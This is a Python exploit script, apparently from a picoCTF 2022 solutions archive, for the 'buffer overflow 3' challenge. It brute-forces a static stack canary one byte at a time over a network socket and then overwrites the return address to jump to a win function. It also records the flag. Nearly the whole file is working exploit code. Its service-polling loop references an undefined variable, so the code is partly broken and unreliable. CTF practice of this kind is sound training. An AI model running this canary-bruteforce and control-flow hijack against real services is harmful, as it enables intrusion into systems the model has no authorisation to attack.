# 260 - buffer overflow 3  (Binary Exploitation, picoCTF 2022)
# Flag: academy{Stat1C_c4n4r13s_4R3_b4D_b379746b}
# Write-up: ../../../writeups/binary-exploitation/260-buffer-overflow-3.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, json, re, time, socket, struct

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

host = port = None
for _ in range(12):
    time.sleep(2)
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
WIN = 0x08049236


def attempt(payload):
    """envoie count=len(payload) puis payload ; retourne la reponse"""
    try:
        s = socket.create_connection((host, port), timeout=10)
        s.settimeout(5)
    except Exception as e:
        return None
    try:
        buf = b""
        while b"> " not in buf:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        s.sendall(str(len(payload)).encode() + b"\n")
        buf2 = b""
        while b"Input> " not in buf2:
            c = s.recv(4096)
            if not c:
                break
            buf2 += c
        s.sendall(payload)
        out = b""
        t0 = time.time()
        while time.time() - t0 < 5:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


canary = b""
for k in range(4):
    found = None
    for b in range(256):
        payload = b"A" * 64 + canary + bytes([b])
        r = attempt(payload)
        if r is None:
            continue
        if "Stack Smashing" not in r:
            found = b
            print("canary[%d] = 0x%02x" % (k, b), flush=True)
            break
    if found is None:
        print("echec sur l'octet", k)
        break
    canary += bytes([found])
print("canary =", canary.hex())
if len(canary) == 4:
    payload = b"A" * 64 + canary + b"B" * 4 + b"C" * 4 + struct.pack("<I", WIN)
    print("payload final:", len(payload), "octets")
    r = attempt(payload)
    print("=== reponse ===")
    print((r or "")[:600])
    f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r or "")
    print("FLAG:", f.group(0) if f else None)
